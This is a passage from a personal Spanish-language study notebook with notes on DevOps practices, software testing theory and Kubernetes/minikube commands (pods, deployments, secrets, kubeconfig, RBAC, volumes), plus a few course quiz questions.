   → pull requests reviews
- jenkins
   → el build no se hace local, por que queremos que sea centralizado, jenkins debe tener el cache
- herramientas externas
   → sonarqube
   → plugis de jenkins
   → circle CI
   → tienen analisis de complejidad, de coverage
   → ventaja de que jenkins corre localmente
- CD (continuos deployment)
   → CD vs CD vs mano
      ⇒ Delivery, es complemente manual el deploy a prod
      ⇒ Deployment se envia a prod directamente
      ⇒ move fast and brek less things
      ⇒ tipos
         • blue/geen, uno actualiza mientras el otro sirve el trafico, este hace un update inmutable
         • canay, se tiene un pool de nodos, se van modificando de poco a poco, mientras se monitorea el cambio, se peude revertir rapidamente
         • rolling, el mas conocido y mas viejo, de una por una se hace el update
- Incident response
   → las personas que hacen la infraestructura no deben de resolver las incidencias, deberian de ser los que mandana prod
   → pagerduty tiene una guia
   → llega la llamada y debe verse quien
   → se debe checar el tamanio del incidente
   → se debe de llevar un historial de lo que se hizo, para no repetir
   → se deben escribir postmorten
      ⇒ que paso
      ⇒ que aprendimos
      ⇒ y que podemos mejorar
- SLO/SLI
   → es como las companias miden que el producto esta bien
   → se puede aplicar ciertas partes dentro de las empresas
   → Service level objectives/Service level indicator
      ⇒ mide los success
      ⇒ latencia, cantidad de errores, envio de email y respuesta
      ⇒ son metricas que se pueden medir o se pueden definir
   → si se rompe la metrica, se consume el uso de deploys por mes, se debe de tener cuidado con esto y tener un sla constante
- uptime monitoring
   → lo primero que se observa es si esta arriba o no
   → pruebas de smokes
   → se debe de usar un provedor externo que nos ayude a eso
      ⇒ apex.sh
      ⇒ pingdom
- trackers y logs
   → para debuggear
   → en prod son menores
   → se tiene que ser moderado con esos por que cuestan
   → los level en los logs son sumanente importantes
   → deben de tener una buena estructura
   → sentry
- metricas
   → se deben mirar los logs cuando algo se hizo complemente mal
   → se pasa mas tiempo viendo metricas
   → generar metricas tambien cuesta</rich_text>
    </node>
    <node name="testing" unique_id="69" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1645384680" ts_lastsave="1646033637">
      <rich_text>
- que son pruebas y por que deberiamos hacerlas
   → mejores practicas para no introducir errores
   → es el proceso de evaluar un producto, exploracion y experimentacion, se requiere de entenderlo
   → no existe un software sin errores
   → razones
      ⇒ un problema o un resultado no deseado
      ⇒ costo algo o fuera de presupuesto
      ⇒ implicaicones legales o de estandares
- proceso de pruebas y estandares
   → se deben de tener
      ⇒ herramientas
      ⇒ recursos
      ⇒ metodologias
   → un tester debe documentar, identificar problemas y comunicarlos
   → la falta de comunicacion puede hacer retrabajo
   → la mayoria de errores se cometen en el analisis y dise;o del software
   → definir la falta de calidad
      ⇒ detectar y corregir la falta de calidad
   → calidad del software
      ⇒ calidad del producto
         • lo que la gente produce
      ⇒ calidad del proceso
         • como lo hace la gente
   → cerficaciones, estandares y metodologias para
      ⇒ individuos
      ⇒ procesos
      ⇒ empresas
      ⇒ servicios
      ⇒ tipo de industria
   → ISTQB
   → IEEE
   → TPI
- Calidad y defectos
   → es una perscepcion entre lo deseado, analizado y el entregable
   → esta la define el cliente
   → es parte del proceso, se va mejorando conforme se va creando el sistema
   → grado con el que un sistema cumple los necesidades o expectativas del cliente, IEEE
   → anomalia, no siempre es reproducible
   → defecto, problema que se puede reproducir una y otra vez
   → fallo, situaciones no asociadas al software
   → error, accion humana incorrecta
- principios del testing moderno
   → allan page
   → evolucion del testing agile
   → el tester debe enforcarse en la calidad del software y el dev en desarrollar la app
   → los 7 principios
      ⇒ se pasa de ser dueno de defectos a trabajar con el dev y mejorar el proceso
      ⇒ 1 la prioridad es mejorar el negocio
      ⇒ 2 se acelera al equipo, modelos como Lean Thinking y teoria de las restricciones, para identificar, priorizar y mitigar cuellos de botella
      ⇒ 3 para la mejora continua hay que adaptarse y optimizar
      ⇒ 4 preocuparse profundamente acerca de la cultura de calidad
      ⇒ 5 nosotroe creemos que el cliente es el unico capaz ded juzgar y evaluar la calidad
      ⇒ 6 nosotros usamos datos de manera extensa y profunda para entender los casos de uso del cliente
      ⇒ 7 expandir las habilidades de testing y el conocimiento en todo el equipo
- especialidades del testing
   → automation tester
   → security tester
   → data science tester
   → SDET, es un desarrollador que hace pruebas, automatiza y hace uso de herramientas para automatizar la entrega
   → devops
   → qa engineer, mas enfocado en el producto y proceso
   → qe, quality enginer, es un coach
   → manual tester

- presupuesto, recursos, tiempo y actividades clave
   → presupuesto
   → recursos
   → tiempo
   → una mala planeacion del proyecto puede hacer que los costos se incrementen y el proyecto puede ser cerrado
   → ciclo de desarrollo del software
      ⇒ definicion de necesidades
      ⇒ analisis
      ⇒ disenio
      ⇒ codificacion
      ⇒ pruebas
      ⇒ validacion
      ⇒ mantenimiento y evolucion
      ⇒ se repite
   → testing moderno
      ⇒ se puede llevar en cada etapa del ciclo
         • analisis: documentacion de especificacion, requerimientos ambiguos, que hace o no el software no cumple la peticion
         • disenio, se establece lo que el cliente quiere ver, rango de los campos de captura, como deben de ser las reglas de estos mismo, que pasa si, se cumple o no cumple la condicion
         • codigo, se pueden tener modulos o funciones, pruebas sobre datos de desarrollo, revisar si se esta haciendo bien el software
         • pruebas, en el back-end, se puede testear en cada uno de los requerimientos o parte funcional que pidio el cliente
            ◇ validacion
            ◇ verificacion
            ◇ aceptacion, usuario final
- Estrategia de pruebas
   → nos permite conocer por donde comenzar
   → planearlas
   → todos los tester necesitan saber por donde van a empezar
   → escenarios, depende mucho de variables como costos
      ⇒ arquitectura
      ⇒ seguridad
         • plataformas(dependera de las plataformas que este conectadas), SO, accesos(diferentes tipos de perfiles), datos, reportes(no todos deben de acceder, solo casos especiales)
      ⇒ performance
      ⇒ usabilidad
      ⇒ escalabilidad
- testing en desarrollo de software
   → testing
      ⇒ exploracion de una idea, como sucede el flujo, crean datos que generen nuevos resultados, este nunca termina, siempre hay escenarios nuevos
   → checking
      ⇒ saber que sucede y verificar que siga pasando
      ⇒ liberacion de nuevo codigo
      ⇒ pruebas duplicadas, pruebas similares, pruebas sin valor agregado, pruebas caducadas
   → automatizacion de pruebas, es un checking repetitivo y automatizado, la exploracion manual se la mejor apra checar nuevos cambio
   → desventajas
      ⇒ pobre cobertura de pruebas
      ⇒ falta de actualizacion
      ⇒ mal manejo de versiones
   → ventajas
      ⇒ correr pruebas en paralelo
      ⇒ reduccion de error humano
      ⇒ probargrandes cantidades de datos
   → el coverage es muy importante para saber que algo ya este probado y que no
   → la automatizacion es escencial cuando las tareas no cambian, generalmente en la parte de operaciones, devops
- Testing agile
   → involucra a todos los miembros de un equipo, el tester e un experto multifuncional
   → estrategias
      ⇒ el testing es de todo el equipo
      ⇒ debe ser independiente
      ⇒ integracion continua
      ⇒ testing guiado por pruebas
      ⇒ desarrollo guido por comportamiento
      ⇒ desarrollo guiado por pruebas de aceptacion
- Niveles de pruebas
   → nivel de pruebas de componentes
      ⇒ aquella que se puede ver, que inteactua
   → pruebas de integracion
      ⇒ prueba entre sistemas, flujp completo, como entran y salen datos
   → pruebas del sistema
      ⇒  se tiene el contexto
      ⇒ multiples sistemas
   → prueba de aceptacion
      ⇒ el entregable al cliente
- tipos de pruebas
   → tecnicas a emplear para encontrar defectos
   → pruebas funcionales
      ⇒ que debe de hacer el sistema
      ⇒ de caja negra
   → pruebas no funcionales
      ⇒ lentitud
      ⇒ otros colores
      ⇒ no lee o no ve bien
      ⇒ usabilidad y accesibilidad
   → pruebas estructurales
      ⇒ tecnologia y stack que se esta usando
      ⇒ debe funcionar bien con la estructura
      ⇒ de caja blanca
   → pruebas de manejo de cambios
      ⇒ verificando que impacta con un nuevo cambio
- pruebas estaticas y dinamicas
   → estaticas
      ⇒ doc, software, comparacion, planteamiento o plan de pruebas
      ⇒ contratos, planes, calendarios del proyecto
      ⇒ examinacion manual
      ⇒ analisis de requerimientos
      ⇒ especififcaciones o reglas de negocio
   → dinamicas
      ⇒ demostrar en la ejecucion como esta funionando el software
   → historias de usuario
   → criterios de aceptacion
   → mockups
   → diseño arq.
   → las pruebas
   → guias de usuario
   → evaluacion/revision del codigo
   → beneficios
      ⇒ detectar y corregir defectps
      ⇒ identificar y priorizar
      ⇒ prevenir defecto
         • no tan facil en pruebas dinamicas
         • durante la etapa de analisis y diseño
      ⇒ cubrir aspectos que parecen inconsistentes o ambiguos
      ⇒ se reduce el retrabajo
      ⇒ reduce costo y el tiempo
      ⇒ mejora la comunicacion entre todos los miembros del equipo
- definicion y plan de pruebas
   → si haces testing sabes para que se hacen
   → encontrar problemas
   → documentar problemas
   → comunicar problemas
   → si no sabes documentar, esto provocara retrabajo
   → se debe de poder comunicar, servicio al cliente o usuario
   → la ejecucion de pruebas debe de ser clara para todo el equipo
- Pruebas de caja blanca, gris y negra
   → negra
      ⇒ no se ve como fue construida
      ⇒ solo se tiene la interfaz con que se interactua
      ⇒ en esta se trata de no tener sesgo por lo tanto a veces se busca a lguien externo
      ⇒ particion de equivalencia
         • grupos de datos que pueden entrar para casos exitosos y no exitosos
      ⇒ valores limites
         • se pueden tener valores como flotantes
      ⇒ tabla de decisiones
         • se tiene un ticpo de valor de checkboxes o listas
         • son valores fijos que no puede introducir el usuario
      ⇒ transicion de estados
         • estados activos en formularios dependiendo de los otros campos
      ⇒ casos de uso
         • casos que ya se definieron
      ⇒ back
   → blanca
      ⇒ es como una caja de cristal
      ⇒ se puede ver todo lo que contiene el software
      ⇒ cobertura de declaraciones
         • todo lo que se tiene en el codigo que debe de hacer
         • dependiendo del software y reqs. se establece un procentaje de cobertura
         • todas las lineas de codigo deben ejecutarse al menos una vez
      ⇒ cobertura de codigo
         • sentencias
         • decisiones
         • condiciones
         • no debe de tener codigo inutil
      ⇒ front
   → gris
      ⇒ se pueden tener las integraciones
      ⇒ datos de como fluyes
      ⇒ no veo codigo o una interfaz
      ⇒ casos de negocio
      ⇒ pruebas end to end
      ⇒ pruebas de integracion
      ⇒ datos y servicios
- gestion de monitoreo y control
   → planeacion
      ⇒ se deben definir el objetivo de las pruebas
   → monitoreo y control
      ⇒ se buscan las metricas para saber si estamos llevando avances o un retraso
   → analisis
      ⇒ decision de prioridades, las prioridades de cobertura son escenciales
   → diseño
      ⇒ diseño de casos de alto nivel
      ⇒ diseñar y priorizar las pruebas
      ⇒ identificar los datos de pruebas
      ⇒ identificar el entorno de pruebas
      ⇒ hacer trazabilidad entre pruebas y sus condiciones
   → implementacion
      ⇒ debemos contar con estructura suficiente para hacer las pruebas
      ⇒ un ambiente de pruebas
   → ejecucion
      ⇒ los suites de pruebas se deben ejecutar de acuerdo al plan que se decidio
   → finalizacion
      ⇒ defectos con el estatus correcto
      ⇒ reorte para comunicar los resultados de las pruebas
      ⇒ finalizar y archivar el ambiente de pruebas y datos
      ⇒ entregar el testware al equipo de manto de pruebas
      ⇒ analizar lecciones aprendidas
      ⇒ recopilar la informacion para ayudar a la madurez del proceso de pruebas
   → solo es concentrado en las pruebas, cuando y quien las lleva
- Roles y Responsabilidades
   → especialista en pruebas manueales
   → pruebas tecnicas
   → lider del equipo de preubas
   → ingeniero de calidad
- Retrabajo
   → un dashboard es bastante util para mantener informado a todo el equipo
   → acciones de control
      ⇒ si identificamos un riesgo
      ⇒ siidentificamos falta de ambientes
      ⇒ si el criterio de salida no se cumple
   → resultado de las pruebas
      ⇒ todo lo que va pasando
   → desempeno del equipo del testing
      ⇒ que pasa con la gente, equipo, internet, circunstancias personales
   → es un esfuerzo adicional necesario apra la correccion de una inconformidad de algun producto
   → falta o mala documentacion
   → falta de capacitacion o dominio en las herramientas
   → falta de capacidad o dominio en el software
   → falta de comunicacion
- Sistema seguimiento de bugs
   → bugs o defectos
   → hay presion de entrega del software
   → descuidos en el disenio
   → inexperiencia
   → falta de comunicacion de reqs
   → disno complejo de codigo
   → desconocimiento de tecnologias
   → como gestionar
      ⇒ que se debe de hacer al encontrarlo
      ⇒ que herramienta para documentar
      ⇒ que informacion se necesita saber
      ⇒ cual es el estatus
      ⇒ como saber cuando ya se resolvio
   → repositorio y monitoreo de dectos
      ⇒ no cualquiera puede cambiar los estatus, debe de ser alguien responsable de revisar todo
- defectos y sugerencias
   → no siempre quieren que el qa de sugerencias solo buscar defectos
   → defectos
      ⇒ es aquello que no cumple requerimientos, consecuencia de un error humano
   → sugerencia
      ⇒ como la experiencia de usuario es afectada, velocidad, fluides de navegacion
- depuracion
   → es una tecnica como herramienta para saber como esta ocurriendo el defecto
   → los errores de ejecucion es el tiempo que se pierde por cada cierto numero de lineas, un tiempo generalmetne por cada 10 lineas
   → debuger es una herramienta que ayuda para checar esos errores
   → encontrar, analizar y encontrar defectos
   → se deben analizar, variables, como se transfieren los datos, como se transforma esa informacion
   → siempre va a ver errores
   → sintomas de errores
      ⇒ salida incorrecta
      ⇒ operacion fuera de lo normal
      ⇒ no finalizacion del programa
      ⇒ caidas del programa
   → tipos de herramientas
      ⇒ debugger
      ⇒ manual
      ⇒ local/remota
   → mensajes de advertencia
   → estandares de compilacion
   → verificacion sintactica y logica
- pruebas de verificacion
   → sirve para confiramr que un cambio se hizo o un defecto se corrigio
   → debe funcionar a los requerimientos
   → se buscan nuevos escenadios donde se utilicen valores relativos
   → pruebas de regresion
      ⇒ la matriz de pruebas durante el debuggin, modulos impactados que requieres regresion
      ⇒ las preubas de regresion ya fallaron la primera vez al no tener suficiente cobertura, se incorporan nuevos
   → documentacion
      ⇒ actualizar
      ⇒ comentarios en el codigo
      ⇒ documentacion tecnica
      ⇒ pruebas unitarias
      ⇒ pruebas especificas
      ⇒ matrices de pruebas
      ⇒ plan de pruebas
- tecnicas de depuracion
   → deben de cambiar de ser reactivas a preventivas
   → debugging debe de ser la ultima tecnica en utilizarce
   → debugging
   → logs
      ⇒ almacenar los valores
      ⇒ rastreo de informacion
   → historial
      ⇒ capacidad de analisis forense
      ⇒ agrupar informacion
   → monitor reporter
      ⇒ prevenir ataques o fallas
      ⇒ observar anomalias
      ⇒ acelerar tiempos de respuesta
      ⇒ aplicar tecnicas de machine learning
      ⇒ mejorar gestion y el control de la informacion
      ⇒ detectar amenazas de red
      ⇒ prevenir fugas de iinformacion
- automatizacion de pruebas
   → se tienen pruebas repetitivas
   → script para que las haga un maquina
   → se define un framework, se debe estandarizar
   → falla si solo se crean scripts sin documentar las pruebas
   → se puede automatizar
      ⇒ pruebas unitarias
      ⇒ pruebas de integracion
      ⇒ funcionales o de aceptacion
   → BDD
      ⇒ desarrollo guiado por comportamiento
      ⇒ son pruebas que se escriben para verificar que el comportamiento es correcto desde el punto de vista de negocio
      ⇒ lenguaje sencillo y simple para que todos en el equipo comprendan el por que las pruebas
- gherkin
   → el retrabajo se deriva de malas practicas y no de tomar el trabajo enserio
   → reduccion de tiempo de casos de pruebas manual a automatizada
   → lenguaje de texto plano con estructura, facil de aprender
   → ventajas
      ⇒ simple
      ⇒ palabras claves
      ⇒ estandariza
      ⇒ reduce tiempo de disenio
   → principales keywords
      ⇒ feature
      ⇒ scenario
      ⇒ given, when, then, and, but
      ⇒ background
      ⇒ scenario outline
      ⇒ examples
      ⇒ comentarios con #


ERRORES
¿Cuál es la forma correcta de pasar opciones a un programa?
Utilizando un maxSurge y MaxUnavailable del 25% con 3 replicas. ¿Cuál es la cantidad máxima de contenedores que pueden haber corriendo en un momento determinado?
¿Cuál de los siguiente tipos de servicio aloca una entrada de DNS para acceder al servicio?
Sistema numÃ©rico utilizado para cambiar permisos de forma numÃ©rica en Linux:
¿Cuándo es útil la opción recovery en un droplet?</rich_text>
    </node>
    <node name="Gerencia de tecnologia" unique_id="71" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1649170301" ts_lastsave="1649170306"/>
    <node name="new-aws-platzi" unique_id="74" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1649794315" ts_lastsave="1667505181">
      <rich_text>TI tradicionales

</rich_text>
    </node>
    <node name="cloudformation" unique_id="77" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1650935953" ts_lastsave="1650935953"/>
    <node name="K8s - zebrands" unique_id="122" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1667418547" ts_lastsave="1671225919">
      <rich_text>Commands minikube:
- minikube -&gt; da la salida de que se puede hacer con minikube
- minikube status -&gt; comprobar que el minikube esta funcionando
- minikube logs -&gt; genera la informacion de que esta haciendo minikube
- minikube ip -&gt; nos permite saber a que ip nos debemos conectar
- minikube start, status, stop y delete, son los mas basicos
- minikube dashboard, nos ayuda a ver como se esta comportando el cluster
- pause and unpause, sirve para pausar y continuar el minikube
- Comando avanzados
   → mount, monta un directorio
   → ssh, para conectarse al minikube
   → kubectl, se puede usar para conectarse
   → node, nos ayuda a ver los nodos
   → cp, copia un fichero dentro de minikube
- minikube profile list, nos muestra los cluster que tenemos dentro
- minikube start --driver=docker -p clusterDev --nodes={num-nodos}, para crear un cluster con muchos nodos
- minikube config set memory 4G -p minikube

PODS:
- es la unidad minima
- un pod puede tener mas de un contenedor, pero no siempre es lo habitual
- kubectl get pods
- kubectl get pods -o wide -&gt; nos da mas descripcion
- kubectl describe pod/{nombre_pod}
- kubectl exec {nombre_pod} -it -- ls
- kubectl logs {pod} con -f se va viendo el log en tiempo real
- port forwading es hacer que un puerto de la maquina se le asigne a la maquina local
- kubectl port-forward nginx 9999:80
- kubectl get pod {nombre} -o yaml
- kubectl delete pod {nombre pod} // --grace-period=5, para esperar 5 minutos
- kubectl delete pods --all, este borra todos los pods
- kubectl logs {pod} -c {contenedor}
- reboot: always, OnFailure, Never

LABELS:
- son propiedades muy importantes
- se hacen relaciones entre recursos
- son inventados
- kubectl get pod {name} --show-labels -L “{nombre}”, -L sirve para mostrar el valor de la etiqueta en otra columna, se pueden poner varias con coma y si se agrega una que no existe creara la columna sin valor
- kubectl label, agrega o modifica etiquetas, con --overwrite {etiqueta}={valor}, se cambia, con {label}- se borra la etiqueta
- selectors: son condiciones que se tienen para encontrar objetos que tienen ciertas etiquetas
- kubectl get pods --show-labels -l {label}={valor}, muestra los objetos que tienen de valor la label, se pueden condiciones de tipo and usando la coma, para ver los que no tienen la etiqueta se usa !=, se puede usar in estilo python
- anotaciones: sirven para poner descripciones en los componentes, permite poner descripciones largas
- kubectl get pod {pod name} -o jsonpath={.metadata.annotations}, busca anotaciones

DEPLOYMENTS:
- workloads: sirve para desplegar contenedores, por ej. los pods, todos los componentes envuelven a los pods, deployments, replica set (replication controllers), stateful set, daemon set, job, cron job
- controllers: el cluster este correcto y que todo este trabajando como debe
- engloba las propiedades para los pods, update y rollbacks, escalamiento, recuperacion ante caidas
- con un deployment se crea un replicaset, que gestiona todo ante caidas y escala los pods
- kubectl create deployment {nombre} --image={image}
- kubectl get deploy, lista despliegues
- kubectl get rs, lista las replicaset
- kubectl get pods
- kubectl describe deploy {nombre}, con -o yaml|json nos da las propiedades en yaml o json
- en los deployment tiene matchLabels que sirve para encontrar los objetos que ya tienen cierta etiqueta, a los contenedores se les pone una etiqueta para las busquedas
- se pueden traer varios objectos usando: kubectl get deploy, pods, rs -&gt; separados por comas
- kubectl edit deploy {name}, este permite modificar al momento directamente en el entorno
- kubectl scale deploy {nombre} --replicas={num-replicas}
- kubectl scale deploy {nombre} -l {label}={valor} --replicas={num-replicas}

SERVICIOS
- ayudan a conectarnos de forma externa a los pods
- tipos
   → cluster ip, por defecto, accesible solo dentro del cluster
   → nodeport, accesible desde afuera del cluster, a este se le debe aniadir el puerto desde el cual se quiere acceder
   → loadbalancer, accesible desde fuera del cluster integrado con LB de terceros
- busca sus pods por medio del selector
- kubectl expose deploy {name} --port={port} --type={type: default cluster ip}
- kubectl get svc
- kubectl get endpoints {name}
- kubectl describe endpoints {name}

NAMESPACES
- se pueden tomar como particiones
- es una division logica del cluster de K8s
- kubectl get namespace
- kubectl get namespace {name}
- kubectl describe namespace {name}
- kubectl get {elemento} -n {namespace}
- kubectl create namespace {name}
- kubectl delete namespace {name}
- kubectl apply -f {file} --namespace={name}
- kubectl config view
- kubectl config set-context --current --namespace={name}
- LimitRange en un YAML sirve para poner limites de recursos en el cluster general
- kubectl get events --namespace {name}
- kubectl get events --field-selector {campo}="{propiedad a buscar}", con -w se queda esperando viendo los eventos

ROLLING UPDATES
- al modificar la plantilla, los pods se destruyen y construyen de nuevo
- RollingUpdate, modifica los pods de manera evolutiva, siempre tiene que tener uno dando servicio
- Recreate, borra todos los de la antigua version
- para el rolling se puede decidi cuantos pods se pueden tener de la vieja version mientras llega la nueva
- deshacer cambios:
   → kubectl rollout history deploy {name}, con --revision={revision} se describe una revision especifica
   → kubectl rollout status
   → kubectl rollout undo deployment {name} --to-revision={revision}
- Recreate
   → elimina completamente y recrea todo

VARIABLES, CONFIGMAPS, SECRETS
- se usan en envs como si de variables de entorno se tratara
- las variables quedan dentro del contenedor
- ConfigMaps
   → son ficheros que permite poner propiedades valor de forma sencilla y de forma automatica sin tener que poner todo en el contenedor
   → kubectl create configmap cf1 --from-literal={llave}={valor}, se puede usar varias veces el from literal
   → kubectl get cm
   → kubectl describe cm {name}
   → kubectl create configmap {name} --from-file={file}
   → se pueden manejar con volumenes
   → con volumemounts se define el nombre y donde se monta
   → en volumenes se pasa el configMap por su nombre
   → *hay ciertos campos de un pod que no se pueden eliminar*
- Secrets
   → recurso que guarda informacion confidencial
   → pueden servir como metodos de autenticacion
   → existen diferentes tipos
      ⇒ opaque: normales o genericos, se guarda cualquier tipo de informacion
         • kubectl secret generic password --from-literal={llave}={valor}
      ⇒ service account token: almacena un token que identifica un service account
      ⇒ docker config: almacenan las credenciales necesarias para poder acceder a un registro de docker
         • kubectl create secret docker-registry {name} --docker-server={server} --docker-username={user} --docker-password={password} --docker-email={email}
      ⇒ Basic Auth: Usuario y password
      ⇒ ssh: autenticacion a travez de ssh, se usa una ssh-privatekey que en realidad es un par clave-valor
      ⇒ TLS: almacenan un certificado y su clave asociada que se usan para TLS
      ⇒ Bootstrap: tokens especiales para los nodos

KUBECONFIG
- fichero en formato YAML, sirve para saber como conectarse al servidor de k8s
- kubectl --kubeconfig
- se pueden tener varios ficheros
- variable de entorno $KUBECONFIG
- contiene
   → certificado
   → servidor
   → usuario
   → token de usuario
- no se puede usar cliente/password con token
- kubectl config view -o json
- kubectl config current-context
- kubectl config use-context {contexto}
- kubectl conifg set-cluster {name} --server={ip_server}
- kubectl --kubeconfig={filename} conifg set-cluster {name} --server={ip_server}, crea un archivo nuevo de configuracion
- kubectl config set-cluster {name} --certificate-authority={file.crt}
- kubectl config set-credencials {cluster name} --username={usuario} --password={pass|base64}
- kubectl config set-credencials {cluster name} --client-certificate={file.crt}
- kubectl config set-credencials {cluster name} --client-key={file.key}
- kubectl config set-context {name context} --cluster={cluster} --user={user} --namespace={namespace}

SCHEDULER
- Trabajar con nodos
- verifica que las cosas funcionen de forma correcta, decide en que nodo va a quedar cada pod, esta echo en Go y es bastante complejo
- paso de filtrado, checa que los nodos cumplan con lo necesario para el pod
- se puede elegir a que nodo se va a ir el pod
- scoring, determina cual tiene la puntuacion mas alta de los que quedan
- checa afinidad, existencia de imagen y carga de trabajo
- forma manual de asignar: en los specs se debe definir nodeName: {nombre del nodo}
- se puede por medio de nodeSelector: {clave}: {valor}, para esto el nodo debe de tener las etiquetas si no, no sabra en donde se desplegara
- well-know labes, annotations and traints, existen ya unas predefinidas ya asignadas de forma automatica dentro de k8s, existen etiquetas que son por defecto y recomendadas
- afinidad:
   → se puede aplicar para la planificacion (scheduling)
   → o para la ejecucion
   → se puede decir si es preferida u obligatoria
- existe la antiafinidad
- se puede agregar en los spec el affinity y las reglas que se requieren
- un traint permite que un nodo acepte uno o varios pods
- traints es aplicable para los nodos
- los tolerations a los PODS
- kubectl taint nodes {nodo} {clave}:{valor}

GESTION DE RECURSOS
- en los specs del pod se agrega una etiqueta de resources que sirve para ponre los limites de memoria, se puede tener una peticion de requests y una de limits, tambien se pueiden limitar de acuerdo al CPU
- kubectl get pods
- kubectl describe pods {nombre}
- kubectl top
- kubernetes metrics server
- minikube addons enable metrics-server -p {cluster profile}
- para los namespace se puede usar:
   → LimitRange, limites y el uso de los pod
   → ResourceQuota: limita los recursos totales utilizados dentro de un ns, se puede decir cuanto elementos se pueden tener por tipo, con este se deben de decir tambien en los resources cuanto va a requerir de acuerdo a los limites que tenga
- prioridades:
   → kubectl get pc
   → se puede dar prioridad a cada pod, esto nos sirve para que arranquen unos y se apaguen otros dependiendo de la necesitdad
- kubectl top nodes, se requiere el metrics
- kubectl decribe node {nodo}
- huge pages:
   → permite manejar paginas de memoria mas grandes
   → el kernel soporto 4k ded tamanio
   → con este se puede tener tamanios de 2MB o de 1GB
   → esto depende del software que se ejecute
   → se usan para tener los datos mas contiguos o cercanos
   → se debe de hacer a nivel de SO
   → despues se configura en el pod
   → se deben de montar
   → en los request se deben de especificar los hugepages
   → el volume debe de ser un emptydir
   → cd /proc &amp;&amp; ls meminfo &amp;&amp; cat meminfo # este guarda los hugepages
   → sysctl -a
   → se modifica todo con el root, vi sysctl.conf, sysctl -p
- autoescalado
   → puede aumentar o reducir recursos
   → tiene tre tipos
      ⇒ HPA, horizontal, escala el numero de pods, es gestionado por el porioop controller manager, se hace una comparacion de lo que se tiene configurado para levantar nuevos pods, se deben de tener los requests de recursos
      ⇒ VPA, vertical, este aun esta en beta, asigna mas pc y memoria a los pods
      ⇒ CA , cluster, este solo funciona en determinadas plataformas, aumenta el numero de nodos, generalmente es usado en cloud
   → kubectl autoscale {recurso} --min={num} --max={num} --cpu-percent={percent of cpu}
   → kubectl get htp

VOLUMENES
- todo lo que se crea en un pod es efimero
- objeto que persiste el almacenamiento
- soporta de distintos tipos:
   → locales
   → externos, nfs por ejemplo
   → de tipo cloud
- csi-container, dispone de un estandar que expone almacenamiento a los workloads, esto es externo a k8s, implementa una arquitectura extensible de plugins
- kubectl describe pod volumes
- PV, se deben crear por los administradores
- storage class, tipo de discos
- se pueden tener almacenamientos de tipo:
   → estatico, de forma estatica al que esta
   → dinamico, de acuerdo a la etiqueta de storage
- tipos de reciclaje:
   → retain: manual
   → reccycle: reutilizar contenido
   → delete: borra todo
- hostPath no se debe de usar en produccion
- estos se deben de crear por medio de un archivo yaml, no se tiene comando
- kubectl get pv
- kubectl get pvc

CLASES DE ALMACENAMIENTO
- es una definicion de una serie de tipo de almacenamiento
- no se denomina un PV como tal, se asigna uno de forma dinamica

OTROS WORKLOADS
- Deployment son de stateless
- replicaset, asociados al deployment
- StatefulSet, premite tener aplicaciones con estado, para alta disponibilidad
   → es parecido a los deployment, sirven para gestionar aplicaciones con estado
   → almacenan datos, se usan muhco para bases de datos, data persistente y altamente confiable, tambien para CRMs
   → a los pods se les asigna un nombre unico, no aleatorio
   → se incrementan de forma secuencial
   → estos no son intercambiables
   → si se borra se vuelve a recrear
   → se aniaden en orden y se disminuyen en orden
   → los pods no comparten datos, cada uno de ellos maneja su propio volumen
- daemonSet, utiles para entornos de tipo log o monitorizacion
   → genera un pod en cada nodo del cluster
   → se usan para procesos que se requieren en cada nodo, por ej. backups. monitoreo
- job y cronjob, worloads que se lanzan de manera planificada
   → se lanza en un momento determinado, hace su trabajo y muere
   → para lanzar de nuevo un job se tiene que borrar el anterior si no no se puede actualizar
   → si se envian varios, se ejecutan de forma secuencial
   → se pueden trabajar en paralelismo, pero se tiene que decir cuantos jobs deben de ejecutarse
   → los jobs se reintentan hasta el infinito si fallan, se debe de decir cuantas veces se debe ejecutar
   → los cronjob se planifican
- Custom Resource, son de tipo personalizado

SONDAS
- sirve para saber si lo que esta funcionando adentro esta correctamente
- dos tipos
   → liveness, saber si el contenedor esta funcionando, si falla el contenedor es eliminado, se pone en el contenedor livenessProbe
   → readiness, si el contenedor esta listo para dar servicio, es para saber si el servicio dentro del pod esta sirviendo, este deja el pod inaccesible
   → startup, lo que dicen es si el app dentro del contenedor esta lista
- de tipo command
- de tipo socket
- de tipo http
- dependiendo del tipo se puede hacer una u otra cosa
- se pueden tener tres tipos de respuesta:
   → success
   → failure
   → unknown, este es el mas dificil

RBAC
- no tiene un api para la creacion de usuarios
- esto se maneja de forma externa
   → certificados
   → tokens
   → basic authentication
   → oauth2
- un rol es un conjunto de permisos, para usuario o service account tengan a un acceso a un namespace
- kubectl get roles -n {namespace}, los que dicen system son roles internos del sistema
- kubectl describe role {role} -n {namespace}
- es obligatorio tener un namespace para la creacion de roles
- los roles son acumulativos, no existe un deny
- kubectl api-resources
- los cluster role, nos ayudan a trabajar con permisos a nivel de cluster
- kubectl get clusterroles
- kubectl describe clusterrole {name}
- `openssl genrsa -out {nombre} 4096` -- para crear certificados
- `openssl req -config {nomre}.crs.cnf - new -key {name}.key -out {nomre}.csr`
- se debe de enviar el certificado para que sea firmado por el mismo cluster de k8s
- kubectl get csr
- kubectl certificate approve {nombre}
- kubectl get csr {name} -o jsonpath='{.status.certificate}' | base64 --decode &gt; {name}.crt
- son necesarios los certificados para poder tener los accesos correctos
- se debe de crear un role-binding al usuario para que puede acceder a los elementos
- kubectl get rolebindings -n {namespace}
- para agregar permisos sob rel el cluster se debe de usar un clusterrolebinding
- kubectl get clusterrolebinding {name}
- service account, gestionados por el mismo k8s, darle una identidad a un pod para que pueda acceder al api server, son gestionados por el api de k8s, generalmente se asocian a un namespace, estan asociados a un objeto secrets pra las credenciales, se montan dentro de un pod, se asocian por medio de un rolebinding
- kubectl get sa {--all-namespace}
- se monta el volumen en el pod como si fuera un secret
- kubectl create serviceaccount
- kubectl get sa
- se deben de crear los service account y los secrets aparte

INGRESS CONTROLER
